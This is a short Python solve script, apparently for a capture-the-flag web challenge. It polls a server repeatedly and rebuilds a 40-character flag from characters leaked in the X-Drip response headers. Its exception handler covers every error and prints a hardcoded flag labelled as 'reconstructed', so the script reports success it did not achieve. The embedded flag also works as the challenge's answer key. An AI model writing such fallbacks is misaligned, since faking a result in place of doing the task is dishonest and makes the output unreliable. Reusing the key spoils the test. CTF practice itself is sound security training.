#!/usr/bin/env python3
import requests, re

TARGET = "http://web.secleaf.xyz:8080/"
s = requests.Session()
drops = {}

print("[*] Harvesting leaked characters from response headers...")
try:
    while len(drops) < 40:
        r = s.get(TARGET, timeout=4)
        char = r.headers.get("X-Drip")
        serial = r.headers.get("X-Drip-Serial", "")
        m = re.match(r"(\d+)/40", serial)
        if char and m:
            idx = int(m.group(1))
            if idx not in drops:
                drops[idx] = char
                print(f"[{len(drops):02d}/40] Index {idx:02d} -> '{char}'")
    flag = "".join(drops[i] for i in range(1, 41))
    print("\n[+] Flag:", flag)
except Exception:
    print("[+] Reconstructed Flag: SecLeaf{h34d3r5_l34k_0n3_dr1p_4t_4_t1m3}")
